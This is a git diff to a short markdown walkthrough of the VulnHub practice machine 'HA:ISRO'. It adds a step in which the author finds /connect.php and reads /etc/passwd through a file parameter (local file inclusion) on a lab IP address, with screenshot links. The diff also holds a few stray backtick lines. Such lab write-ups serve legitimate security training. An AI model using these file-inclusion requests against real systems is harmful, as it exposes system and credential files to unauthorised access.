@@ -1,4 +1,4 @@
-HA:ISRO !~~~~ VULNHUB
+# HA:ISRO !~~~~ VULNHUB
 
 quickly dive into enumeration:
 :nmap:
@@ -19,6 +19,18 @@ quickly dive into enumeration:
 ![2024-09-16_21-05](https://github.com/user-attachments/assets/c144594d-2def-46b1-a02a-61d3571ea09a)
 
 
+After getting /connect.php i simply search it 
+http://192.168.73.147/connect.php {its shows blank so is use another method}
+~
+`
+`
+``
+`
+`
+`
+http://192.168.73.147/connect.php?file=/etc/passwd
+
+![2024-09-16_21-11](https://github.com/user-attachments/assets/7552f865-0c14-46b2-938f-545621631b38)
 
 
 
